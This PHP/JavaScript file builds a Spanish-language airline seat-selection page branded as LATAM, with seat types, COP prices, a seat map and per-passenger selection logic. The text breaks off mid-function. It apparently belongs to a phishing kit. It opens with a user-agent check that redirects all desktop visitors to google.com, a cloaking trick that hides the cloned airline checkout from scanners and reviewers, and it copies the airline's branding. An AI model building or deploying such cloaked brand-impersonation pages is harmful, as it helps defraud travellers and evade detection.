<?php

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

$mobileKeywords = [
    'Mobi', 'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 
    'webOS', 'Windows Phone', 'Kindle', 'Opera Mini'
];

$isMobile = false;

foreach ($mobileKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false) {
        $isMobile = true;
        break;
    }
}

if (!$isMobile) {
    header('Location: https://www.google.com');
    exit;
}

?>
<?php
/* ------------------------
 * seleccion-asiento.php
 * ------------------------
 * Recibe por GET los mismos parámetros de resultados-vuelos.php
 * + leg=outbound|return para saber si estamos eligiendo ida o vuelta
 */

function h($s){ return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
function sanitize($s){
  $s = is_string($s) ? $s : '';
  return htmlspecialchars(trim($s), ENT_QUOTES, 'UTF-8');
}
function format_cop($n){
  $n = is_numeric($n) ? (float)$n : 0;
  return 'COP '.number_format($n, 0, ',', '.');
}

// ----------- Params base -----------
$origin         = isset($_GET['origin']) ? sanitize($_GET['origin']) : 'Origen';
$destination    = isset($_GET['destination']) ? sanitize($_GET['destination']) : 'Destino';
$departure_date = isset($_GET['departure-date']) ? sanitize($_GET['departure-date']) : '';
$return_date    = isset($_GET['return-date']) ? sanitize($_GET['return-date']) : '';
$passengers_str = isset($_GET['passengers']) ? sanitize($_GET['passengers']) : '1 adulto';
$cabin          = isset($_GET['cabin']) ? sanitize($_GET['cabin']) : 'Economy';
$promo_code     = isset($_GET['promo_code']) ? sanitize($_GET['promo_code']) : '';

$out_price      = isset($_GET['out_price']) ? (int)$_GET['out_price'] : 0;
$ret_price      = isset($_GET['ret_price']) ? (int)$_GET['ret_price'] : 0;

$is_one_way     = empty($return_date) || $return_date==='N/A';
$leg            = isset($_GET['leg']) ? ($_GET['leg']==='return'?'return':'outbound') : 'outbound';

// Guardar asiento de ida si venimos de ese paso
$out_seat       = isset($_GET['out_seat']) ? sanitize($_GET['out_seat']) : '';
$out_seat_type  = isset($_GET['out_seat_type']) ? sanitize($_GET['out_seat_type']) : '';
$out_seat_price = isset($_GET['out_seat_price']) ? (int)$_GET['out_seat_price'] : 0;

// ----------- Encabezados por tramo -----------
if ($leg==='outbound') {
  $title_left  = "$origin a $destination";
  $title_right = $is_one_way ? '' : "$destination a $origin";
  $date_left   = $departure_date;
  $date_right  = $is_one_way ? '' : $return_date;
  $next_label  = $is_one_way ? 'Continuar' : 'Pasar al siguiente vuelo';
} else {
  // return
  $title_left  = "$origin a $destination";
  $title_right = "$destination a $origin";
  $date_left   = $departure_date;
  $date_right  = $return_date;
  $next_label  = 'Continuar';
}

// ----------- Precios por tipo de asiento -----------
$seat_prices = [
  'latam_plus' => 46300,
  'front'      => 42800, // "Más adelante"
  'exit'       => 43500, // Salida de emergencia
  'standard'   => 23800,
  'first_row'  => 30000, // Precio para la nueva "Primera Fila"
];

// Derivar cantidad de pasajeros (simple)
if (preg_match('/(\d+)/', $passengers_str, $m)) {
  $passengers_count = max(1, (int)$m[1]);
} else {
  $passengers_count = 1;
}
?>
<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <title>Selecciona tu asiento</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- CSS externo para el módulo de asientos -->
  <link rel="stylesheet" href="assets/css/asientos.css">
</head>
<body>

<!-- Encabezado de tramos -->
<div class="topbar">
  <div class="stepchip <?php echo $leg==='outbound'?'active':''; ?>">
    <div class="route"><?php echo h($title_left); ?></div>
    <div class="date"><?php echo h($date_left ?: ''); ?></div>
  </div>
  <?php if(!$is_one_way): ?>
  <div class="stepchip <?php echo $leg==='return'?'active':''; ?>">
    <div class="route"><?php echo h($title_right); ?></div>
    <div class="date"><?php echo h($date_right ?: ''); ?></div>
  </div>
  <?php endif; ?>
</div>
<!-- Header móvil compacto (solo móvil) -->
<div class="seat-mobile-header">
  <div class="smh-title">Elige tus asientos</div>
  <div class="smh-route">
    <?php echo h($leg === 'outbound' ? $title_left : ($title_right ?: $title_left)); ?>
  </div>
  <div class="smh-date">
    <?php
      $d = ($leg === 'outbound') ? $date_left : ($date_right ?: $date_left);
      echo h($d);
    ?>
  </div>
</div>


<div class="wrap">
  <!-- Columna izquierda: tipos -->
  <div class="left panel">
    <!-- Se remueve el legend ya que la imagen no lo muestra explícitamente con esa estructura -->

    <!-- Opción LATAM+ -->
    <div class="option expanded" data-select-type="latam_plus">
      <div class="option-card-header latam-plus-header-color">
        <div class="option-card-title-group">
          <div class="option-main-icon latam-plus-icon-bg">
            <!-- Icono LATAM+ -->
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-white"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
          </div>
          <div class="name">LATAM+</div>
        </div>
        <div class="option-price-arrow">
          <span class="price-label">Desde</span>
          <div class="price-value-and-arrow">
            <div class="price"><?php echo format_cop($seat_prices['latam_plus']); ?></div>
            <svg class="arrow-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
          </div>
        </div>
        <div class="info-icon-wrapper">
          <svg viewBox="0 0 24 24" fill="currentColor" class="info-icon"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"></path></svg>
        </div>
      </div>
      <div class="option-details">
        <div class="hint-line">
          <svg viewBox="0 0 24 24" fill="currentColor" class="hint-icon"><path d="M14 6V4h-4v2c-2.76 0-5 2.24-5 5v7h2v-7c0-1.65 1.35-3 3-3h4c1.65 0 3 1.35 3 3v7h2v-7c0-2.76-2.24-5-5-5zM9 20h6v2H9v-2z"></path></svg>
          <p class="hint">Más espacio para tus piernas</p>
        </div>
        <div class="hint-line">
          <svg viewBox="0 0 24 24" fill="currentColor" class="hint-icon"><path d="M17 6H7c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm0 10H7V8h10v8zM12 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"></path></svg>
          <p class="hint">Compartimento exclusivo para tu maleta pequeña 12 kg</p>
        </div>
        <div class="hint-line">
          <svg viewBox="0 0 24 24" fill="currentColor" class="hint-icon"><path d="M10.09 15.09L12 12.17l1.91 2.92L16 13.5l-4-6-4 6 1.91 1.59zM12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"></path></svg>
          <p class="hint">Embarque Premium</p>
        </div>
        <div class="hint-line">
          <svg viewBox="0 0 24 24" fill="currentColor" class="hint-icon"><path d="M13.5 5.5c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zM17.8 8.2l-3.2-3.2L12 7.8 7.4 3.2C6.9 2.7 6.1 2.7 5.6 3.2L3.2 5.6c-.5.5-.5 1.3 0 1.8l4.6 4.6 1.4-1.4 1.4 1.4c.5.5 1.3.5 1.8 0l1.4-1.4 4.6 4.6c.5.5 1.3.5 1.8 0l2.4-2.4c.5-.5.5-1.3 0-1.8z"></path></svg>
          <p class="hint">Desembarca más rápido</p>
        </div>
      </div>
    </div>

    <!-- Opción Más adelante -->
    <div class="option" data-select-type="front">
      <div class="option-card-header front-header-color">
        <div class="option-card-title-group">
          <div class="option-main-icon front-icon-bg">
            <!-- Icono Más adelante -->
            <svg viewBox="0 0 24 24" fill="currentColor" class="w-5 h-5 text-white"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
          </div>
          <div class="name">Más adelante</div>
        </div>
        <div class="option-price-arrow">
          <span class="price-label">Desde</span>
          <div class="price-value-and-arrow">
            <div class="price"><?php echo format_cop($seat_prices['front']); ?></div>
            <svg class="arrow-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
          </div>
        </div>
      </div>
      <div class="option-details">
        <div class="hint-line">
          <svg viewBox="0 0 24 24" fill="currentColor" class="hint-icon"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
          <p class="hint">Siéntate en la parte delantera del avión</p>
        </div>
        <div class="hint-line">
          <svg viewBox="0 0 24 24" fill="currentColor" class="hint-icon"><path d="M13.5 5.5c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zM17.8 8.2l-3.2-3.2L12 7.8 7.4 3.2C6.9 2.7 6.1 2.7 5.6 3.2L3.2 5.6c-.5.5-.5 1.3 0 1.8l4.6 4.6 1.4-1.4 1.4 1.4c.5.5 1.3.5 1.8 0l1.4-1.4 4.6 4.6c.5.5 1.3.5 1.8 0l2.4-2.4c.5-.5.5-1.3 0-1.8z"></path></svg>
          <p class="hint">Embarca y desembarca con prioridad</p>
        </div>
      </div>
    </div>

    <!-- Opción Salida de emergencia -->
    <div class="option" data-select-type="exit">
      <div class="option-card-header exit-header-color">
        <div class="option-card-title-group">
          <div class="option-main-icon exit-icon-bg">
            <!-- Icono Salida de emergencia -->
            <svg viewBox="0 0 24 24" fill="currentColor" class="w-5 h-5 text-white"><path d="M14 6V4h-4v2c-2.76 0-5 2.24-5 5v7h2v-7c0-1.65 1.35-3 3-3h4c1.65 0 3 1.35 3 3v7h2v-7c0-2.76-2.24-5-5-5zM9 20h6v2H9v-2z"></path></svg>
          </div>
          <div class="name">Salida de emergencia</div>
        </div>
        <div class="option-price-arrow">
          <span class="price-label">Desde</span>
          <div class="price-value-and-arrow">
            <div class="price"><?php echo format_cop($seat_prices['exit']); ?></div>
            <svg class="arrow-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
          </div>
        </div>
      </div>
      <div class="option-details">
        <div class="hint-line">
          <svg viewBox="0 0 24 24" fill="currentColor" class="hint-icon"><path d="M14 6V4h-4v2c-2.76 0-5 2.24-5 5v7h2v-7c0-1.65 1.35-3 3-3h4c1.65 0 3 1.35 3 3v7h2v-7c0-2.76-2.24-5-5-5zM9 20h6v2H9v-2z"></path></svg>
          <p class="hint">Más espacio para tus piernas</p>
        </div>
        <div class="hint-line">
          <svg viewBox="0 0 24 24" fill="currentColor" class="hint-icon"><path d="M13.5 5.5c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zM17.8 8.2l-3.2-3.2L12 7.8 7.4 3.2C6.9 2.7 6.1 2.7 5.6 3.2L3.2 5.6c-.5.5-.5 1.3 0 1.8l4.6 4.6 1.4-1.4 1.4 1.4c.5.5 1.3.5 1.8 0l1.4-1.4 4.6 4.6c.5.5 1.3.5 1.8 0l2.4-2.4c.5-.5.5-1.3 0-1.8z"></path></svg>
          <p class="hint">Embarca con prioridad</p>
        </div>
        <div class="hint-line">
          <svg viewBox="0 0 24 24" fill="currentColor" class="hint-icon"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"></path></svg>
          <p class="hint">Necesitarás cumplir con requisitos especiales</p>
        </div>
      </div>
    </div>

    <!-- Opción Estándar -->
    <div class="option" data-select-type="standard">
      <div class="option-card-header standard-header-color">
        <div class="option-card-title-group">
          <div class="option-main-icon standard-icon-bg">
            <!-- Icono Estándar -->
            <svg viewBox="0 0 24 24" fill="currentColor" class="w-5 h-5 text-white"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
          </div>
          <div class="name">Estándar</div>
        </div>
        <div class="option-price-arrow">
          <span class="price-label">Desde</span>
          <div class="price-value-and-arrow">
            <div class="price"><?php echo format_cop($seat_prices['standard']); ?></div>
            <svg class="arrow-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
          </div>
        </div>
      </div>
      <div class="option-details">
        <div class="hint-line">
          <svg viewBox="0 0 24 24" fill="currentColor" class="hint-icon"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
          <p class="hint">Elige el asiento de tu preferencia</p>
        </div>
      </div>
    </div>

    <!-- La opción "Primera Fila" no está en la imagen de referencia para el panel izquierdo,
         pero la mantendré en la lógica si es relevante para el flujo general.
         Si debe ser parte del panel izquierdo visible, se añadiría aquí con su estructura de tarjeta.
         Por ahora, el panel izquierdo solo muestra las 4 opciones de la imagen. -->
  </div>

  <!-- Columna central: mapa -->
  <div class="center panel">
    <div class="exit-banner">← SALIDA DE EMERGENCIA →</div>
    <!-- Chips de pasajeros (solo se muestran en móvil) -->
    <div id="paxChips" class="pax-chips" aria-label="Pasajeros"></div>
    <div id="seatDeck" class="deck"></div>
    <div class="exit-banner">← SALIDA DE EMERGENCIA →</div>
    <!-- La stickybar se ha movido al panel derecho -->
  </div>

  <!-- Columna derecha: pasajeros -->
  <div class="right panel">
    <div class="right-panel-content-scroll">
      <h2 class="passengers-title">Pasajeros</h2>
      <div class="alert-card" id="eliteBenefitAlert">
        <div class="alert-content">
          <svg viewBox="0 0 24 24" fill="currentColor" class="alert-icon"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"></path></svg>
          <span>Si eres socio Elite LATAM Pass, tus beneficios de asientos y equipaje se verán reflejados al momento de pagar.</span>
        </div>
        <button class="alert-close-btn" onclick="document.getElementById('eliteBenefitAlert').style.display='none';">
          <svg viewBox="0 0 24 24" fill="currentColor" class="w-4 h-4"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
        </button>
      </div>

      <?php for($i=1;$i<=$passengers_count;$i++): ?>
      <div class="passenger-card">
        <div class="passenger-info-row">
          <div class="pax-seat-code-circle" id="paxSeatCircle<?php echo $i; ?>">
            <!-- Seat code will be inserted here by JS -->
          </div>
          <div class="pax-details">
            <div class="paxname">Adulto <?php echo $i; ?></div>
            <div class="pax-seat-type-label" id="paxSeatLabel<?php echo $i; ?>">Sin selección</div>
          </div>
          <div class="pax-price" id="paxPrice<?php echo $i; ?>">
            <?php echo format_cop(0); ?>
          </div>
        </div>
        <div class="pax-actions">
          <a href="#" class="remove-change-seat">Eliminar o cambiar asiento</a>
        </div>
      </div>
      <?php endfor; ?>

      <div class="summary">
      <div class="line">
        <span>Tarifa vuelo (<?php echo $leg==='outbound'?'ida':'vuelta'; ?>) × <?php echo (int)$passengers_count; ?></span>
        <span id="farePriceLabel"><?php echo format_cop(($leg==='outbound'?$out_price:$ret_price) * (int)$passengers_count); ?></span>
      </div>
        <div class="line"><span>Asiento</span><span id="seatPriceLabel"><?php echo format_cop(0); ?></span></div>
        <hr style="border:0;border-top:1px dashed var(--border);margin:8px 0">
      <span id="totalPriceLabel">
        <?php echo format_cop( ($leg==='outbound'?$out_price:$ret_price) * (int)$passengers_count ); ?>
      </span>
      </div>
    </div> <!-- Fin right-panel-content-scroll -->

    <!-- Nueva barra inferior fija del panel derecho -->
    <div class="right-panel-footer">
      <button id="nextBtn" class="btn" disabled><?php echo h($next_label); ?></button>
      <div class="final-price-row">
        <div class="price-label">Precio final</div>
        <div class="price-value-and-arrow">
        <div id="finalPriceFooter" class="pricefinal">
          <?php echo format_cop( ($leg==='outbound'?$out_price:$ret_price) * (int)$passengers_count ); ?>
        </div>
          <svg class="arrow-icon price-arrow-up" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="18 15 12 9 6 15"></polyline></svg>
        </div>
      </div>
    </div> <!-- Fin right-panel-footer -->

  </div> <!-- Fin right panel -->
</div> <!-- Fin wrap -->

<!-- INICIO: Modal para cambiar asiento -->
<div id="changeSeatModal" class="modal-overlay" style="display: none;">
  <div class="modal-content">
    <button id="closeModalBtn" class="modal-close-btn">
      <svg viewBox="0 0 24 24" fill="currentColor" width="24" height="24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
    </button>
    <div class="modal-pax-info">
      <div id="modalPaxSeatCircle" class="pax-seat-code-circle"></div>
      <div class="pax-details">
        <div id="modalPaxName" class="paxname"></div>
        <div id="modalPaxSeatLabel" class="pax-seat-type-label"></div>
      </div>
      <div id="modalPaxPrice" class="pax-price"></div>
    </div>
    <button id="modalChangeSeatBtn" class="btn">Eliminar o cambiar asiento</button>
  </div>
</div>
<!-- FIN: Modal para cambiar asiento -->


<script>
/* ========= JS LADO CLIENTE ========= */

// ---------- Datos del servidor ----------
const SEAT_PRICES = <?php echo json_encode($seat_prices, JSON_UNESCAPED_UNICODE); ?>;
const LEG = <?php echo json_encode($leg); ?>; // 'outbound' | 'return'
const IS_ONE_WAY = <?php echo $is_one_way ? 'true' : 'false'; ?>;

const BASE_FARE = (LEG==='outbound') ? <?php echo (int)$out_price; ?> : <?php echo (int)$ret_price; ?>;
// Nº de pasajeros (desde PHP)
const PAX_COUNT = <?php echo (int)$passengers_count; ?>;
// ===== Estado multi-pasajero =====
let activePax = 1; // pasajero activo (1..PAX_COUNT)

// Selección por pasajero (índice 1..PAX_COUNT)
// Cada item: { code, typeKey, typeName, pos, price }
const paxSelections = Array.from({ length: PAX_COUNT + 1 }, () => null);
// NUEVO: confirmación por pasajero (1..PAX_COUNT)
const paxConfirmed = Array.from({ length: PAX_COUNT + 1 }, () => false);

// helper: primer pasajero sin confirmar (o PAX_COUNT+1 si todos)
function firstUnconfirmedIdx(){
  for (let i=1;i<=PAX_COUNT;i++) if(!paxConfirmed[i]) return i;
  return PAX_COUNT + 1;
}

function refreshFooterAction(){
  const btn = document.getElementById('nextBtn');
  if (!btn) return;
  const f = firstUnconfirmedIdx();

  if (f <= PAX_COUNT){
    btn.textContent = `Confirmar asiento de Adulto ${f}`;
    btn.disabled = !paxSelections[f]; // habilita solo si ese adulto eligió asiento
  } else {
    // CORRECCIÓN: Habilitar el botón solo si TODOS los pasajeros están confirmados.
    const allConfirmed = paxConfirmed.slice(1).every(Boolean);
    btn.textContent = (LEG === 'outbound' && !IS_ONE_WAY) ? 'Pasar al siguiente vuelo' : 'Continuar';
    btn.disabled = !allConfirmed;
  }
}


// Mapa asiento -> nº de pasajero (p.ej. "12A" -> 2) para evitar duplicados
const seatTakenByPax = new Map();

function mapSeat(el){
  const code = el.dataset.code;
  const pos  = el.dataset.pos;
  let key, name;
  switch (el.dataset.type) {
    case 'latam_plus_icon': key='latam_plus'; name='LATAM+'; break;
    case 'standard_icon':   key='standard';   name='Estándar'; break;
    case 'exit_icon':       key='exit';       name='Salida de emergencia'; break;
    case 'first_row_icon':  key='first_row';  name='Primera Fila'; break;
    default: key=null; name='Sin selección';
  }
  const price = key ? (SEAT_PRICES[key] || 0) : 0;
  return { code, typeKey:key, typeName:name, pos, price };
}

function updatePassengerCard(paxIdx){
  const sel = paxSelections[paxIdx];
  const circle = document.getElementById(`paxSeatCircle${paxIdx}`);
  const label  = document.getElementById(`paxSeatLabel${paxIdx}`);
  const price  = document.getElementById(`paxPrice${paxIdx}`);

  if (circle) {
    circle.textContent = sel ? sel.code : '';
    circle.className = 'pax-seat-code-circle';
    if (sel) {
      if (sel.typeKey === 'latam_plus') circle.classList.add('latam-plus-circle-color');
      else if (sel.typeKey === 'standard') circle.classList.add('standard-circle-color');
      else if (sel.typeKey === 'exit') circle.classList.add('exit-circle-color');
      else if (sel.typeKey === 'first_row') circle.classList.add('first-row-circle-color');
    }
  }
  if (label) label.textContent = sel ? `${sel.typeName} - ${sel.pos}` : 'Sin selección';
  if (price) price.textContent = formatCOP(sel ? sel.price : 0);
}

function updateTotals(){
  const seatsTotal = paxSelections.reduce((acc, s) => acc + (s?.price || 0), 0);
  // Si BASE_FARE es por pasajero, usamos * PAX_COUNT
  const baseTotal = BASE_FARE * PAX_COUNT;
  const grandTotal = baseTotal + seatsTotal;

  const seatPriceLabel   = document.getElementById('seatPriceLabel');
  const totalPriceLabel  = document.getElementById('totalPriceLabel');
  const finalPriceFooter = document.getElementById('finalPriceFooter');
  const farePriceLabel = document.getElementById('farePriceLabel');

  if (farePriceLabel) farePriceLabel.textContent = formatCOP(baseTotal);
  if (seatPriceLabel)   seatPriceLabel.textContent   = formatCOP(seatsTotal);
  if (totalPriceLabel)  totalPriceLabel.textContent  = formatCOP(grandTotal);
  if (finalPriceFooter) finalPriceFooter.textContent = formatCOP(grandTotal);

  // La lógica del botón ahora está centralizada en refreshFooterAction
  renderPaxChips();
  refreshFooterAction();

}


// Persistencia de lo ya seleccionado en ida (cuando estamos en vuelta)
const PRESERVE = {
  out_seat: <?php echo json_encode($out_seat); ?>,
  out_seat_type: <?php echo json_encode($out_seat_type); ?>,
  out_seat_price: <?php echo (int)$out_seat_price; ?>
};

// ---------- Generación del mapa ----------
/**
 * Configuración:
 * Filas 3..30, 6 asientos por fila (A B C | D E F)
 * - Filas 3..5: LATAM+ (p-economy-more-space.svg)
 * - Filas 6..10: Estándar (p-economy-standard.svg)
 * - Fila 11: Primera Fila (p-economy-first-row.svg)
 * - Fila 12: Salida de emergencia (p-economy-exit.svg)
 * - Filas 13..30: Primera Fila (p-economy-first-row.svg)
 * Asientos ocupados de ejemplo:
 * '3B','3E','5B','5E','8B','8C','8D','8E' (pre-existentes)
 * '12D','12E','14A','14B' (nuevos de la imagen)
 */
const rows = [];
for (let r=3; r<=30; r++) rows.push(r); // Filas 3 a 30

const letters = ['A','B','C','D','E','F'];

const occupied = new Set([
  '3B','3E', // Asientos ocupados de la primera parte
  '5B','5E',
  '8B','8C','8D','8E',
  '12D','12E', // Asientos ocupados de la fila 12 (verdes)
  '14A','14B'  // Asientos ocupados de la fila 14 (azules)
]);

function seatType(row){
  if (row >= 3 && row <= 5) return 'latam_plus_icon';
  if (row >= 6 && row <= 10) return 'standard_icon';
  if (row === 12) return 'exit_icon'; // Fila 12 es de salida de emergencia (verde)
  // Las filas 11, y 13 a 30 son de primera fila (azul)
  if (row >= 11 && row <= 30) return 'first_row_icon';
  return 'standard_icon'; // Fallback
}

const deck = document.getElementById('seatDeck');

function seatPositionByLetter(letter){
  if (letter === 'A' || letter === 'F') return 'Ventana';
  if (letter === 'C' || letter === 'D') return 'Pasillo';
  return 'Centro'; // B o E
}

function renderDeck(){
  deck.innerHTML = '';

  // Add column labels A, B, C, D, E, F
  const colLabelsWrap = document.createElement('div');
  colLabelsWrap.className = 'cols column-labels';
  colLabelsWrap.innerHTML = `
    <div class="col">
        <div class="column-label">A</div>
        <div class="column-label">B</div>
        <div class="column-label">C</div>
    </div>
    <div class="split-col-labels"></div> <!-- Separador para etiquetas de columna -->
    <div class="col">
        <div class="column-label">D</div>
        <div class="column-label">E</div>
        <div class="column-label">F</div>
    </div>
  `;
  deck.appendChild(colLabelsWrap);


  rows.forEach(row=>{
    // Insert "SALIDA DE EMERGENCIA" above row 11
    if (row === 11) {
      const exitBannerTop = document.createElement('div');
      exitBannerTop.className = 'exit-banner';
      exitBannerTop.textContent = '← SALIDA DE EMERGENCIA →';
      deck.appendChild(exitBannerTop);
    }

    const rowWrap = document.createElement('div');
    rowWrap.className = 'cols';

    const left = document.createElement('div'); left.className='col';
    const right= document.createElement('div'); right.className='col';

    letters.forEach((L, idx)=>{
    const code = `${row}${L}`;
    const type = seatType(row);
    const pos  = seatPositionByLetter(L);

    const el = document.createElement('div');
    el.className = `seat ${type}`;
    el.title = `${code} • ${pos}`;
    el.dataset.code = code;
    el.dataset.type = type;
    el.dataset.pos  = pos;   // Ventana / Pasillo / Centro


      if (occupied.has(code)){
        el.classList.add('occupied');
      } else {
        el.addEventListener('click', ()=>onSelectSeat(el));
      }

      if (idx <= 2) left.appendChild(el); else right.appendChild(el);
    });

    // Número de fila en el medio
    const rowLabel = document.createElement('div');
    rowLabel.className = 'rowlabel';
    rowLabel.textContent = row;

    rowWrap.appendChild(left);
    rowWrap.appendChild(rowLabel); // Añadir el número de fila aquí
    rowWrap.appendChild(right);
    deck.appendChild(rowWrap);

    // Insert "SALIDA DE EMERGENCIA" below row 11
    if (row === 11) {
      const exitBannerBottom = document.createElement('div');
      exitBannerBottom.className = 'exit-banner';
      exitBannerBottom.textContent = '← SALIDA DE EMERGENCIA →';
      deck.appendChild(exitBannerBottom);
    }
  });
}
renderDeck();
renderPaxChips();
refreshFooterAction();
// Renderizar chips (móvil)
function renderPaxChips(){
  const wrap = document.getElementById('paxChips');
  if (!wrap) return;
  wrap.innerHTML = '';
  for (let i=1;i<=PAX_COUNT;i++){
    const sel = paxSelections[i];
    const codeText = sel ? sel.code : '--';
    const chip = document.createElement('button');
    chip.type = 'button';
    chip.className = 'pax-chip';
    chip.innerHTML = `
      <span class="code-badge">${codeText}</span>
      <span class="pax-label">Adulto ${i}</span>
    `;

    // AÑADIR ESTA LÓGICA
    if (sel && sel.typeKey) {
      chip.classList.add(`seat-type-${sel.typeKey}`);
    }

    // estado visual
    const f = firstUnconfirmedIdx();
    if (paxConfirmed[i]) chip.classList.add('confirmed');
    if (i === activePax) chip.classList.add('active');
    if (i > f) chip.classList.add('inactive');

    chip.addEventListener('click', () => {
      // Si el chip ya está confirmado, mostrar el modal
      if (paxConfirmed[i]) {
        showChangeSeatModal(i);
        return;
      }

      const currentAllowed = firstUnconfirmedIdx();
      if (i > currentAllowed){
        chip.classList.add('shake');
        setTimeout(()=>chip.classList.remove('shake'), 400);
        return; // aún no puede
      }
      setActivePax(i);
    });

    wrap.appendChild(chip);
  }
}
renderPaxChips();

// Click en tarjetas de pasajeros para cambiar activo
for (let i = 1; i <= PAX_COUNT; i++) {
  const card = document.querySelectorAll('.passenger-card')[i-1];
  if (!card) continue;
  card.style.cursor = 'pointer';
  card.addEventListener('click', () => setActivePax(i));
}
setActivePax(1); // por defecto
updateTotals();
// Botón "Eliminar o cambiar asiento"
document.querySelectorAll('.passenger-card').forEach((card, idx) => {
  const i = idx + 1;
  const link = card.querySelector('.remove-change-seat');
  if (!link) return;
  link.addEventListener('click', (e) => {
    e.preventDefault();
    unconfirmAndEdit(i);
  });
});

function unconfirmAndEdit(paxIdx) {
    setActivePax(paxIdx); // activa este pasajero
    const sel = paxSelections[paxIdx];
    if (!sel) return;
    
    // Liberar asiento
    seatTakenByPax.delete(sel.code);
    const el = document.querySelector(`.seat[data-code="${sel.code}"]`);
    el?.classList.remove('selected');
    el?.removeAttribute('data-pax');
    paxSelections[paxIdx] = null;

    paxConfirmed[paxIdx] = false;

    // Actualizar UI
    updatePassengerCard(paxIdx);
    updateTotals();
    highlightActivePaxSeat();
}


function setActivePax(i){
  const allowed = firstUnconfirmedIdx();
  if (i > allowed) { // aún no puede seleccionar
    const chips = document.querySelectorAll('.pax-chip');
    const chip = chips[i-1];
    chip?.classList.add('shake'); setTimeout(()=>chip?.classList.remove('shake'), 400);
    return;
  }
  activePax = i;
  document.querySelectorAll('.passenger-card').forEach((c, idx) => {
    if (idx === i-1) c.classList.add('active');
    else c.classList.remove('active');
  });
  highlightActivePaxSeat();
  renderPaxChips();
  refreshFooterAction();
}


function highlightActivePaxSeat(){
  document.querySelectorAll('.seat').forEach(el => el.classList.remove('active-pax-seat'));
  const sel = paxSelections[activePax];
  if (!sel) return;
  const el = document.querySelector(`.seat[data-code="${sel.code}"]`);
  if (el) el.classList.add('active-pax-seat');
}

function onSelectSeat(el){
  // no permitir cambiar si ya confirmó
if (paxConfirmed[activePax]) {
  const chips = document.querySelectorAll('.pax-chip');
  const chip = chips[activePax-1];
  chip?.classList.add('shake');
  setTimeout(()=>chip?.classList.remove('shake'), 400);
  return;
}

  if (el.classList.contains('occupied')) return;

  const code = el.dataset.code;
  const takenBy = seatTakenByPax.get(code);

  // ¿otro pasajero ya lo tiene?
  if (takenBy && takenBy !== activePax) {
    el.classList.add('shake'); setTimeout(() => el.classList.remove('shake'), 300);
    return;
  }

  // liberar asiento previo del pasajero activo si era distinto
  const prev = paxSelections[activePax];
  if (prev && prev.code !== code) {
    seatTakenByPax.delete(prev.code);
    const prevEl = document.querySelector(`.seat[data-code="${prev.code}"]`);
    prevEl?.classList.remove('selected');
    prevEl?.removeAttribute('data-pax');
  }

  // toggle si toca el mismo asiento
  if (prev && prev.code === code) {
    paxSelections[activePax] = null;
    seatTakenByPax.delete(code);
    el.classList.remove('selected');
    el.removeAttribute('data-pax');
  } else {
    const mapped = mapSeat(el); // {code,typeKey,typeName,pos,price}
    paxSelections[activePax] = mapped;
    seatTakenByPax.set(code, activePax);
    el.classList.add('selected');
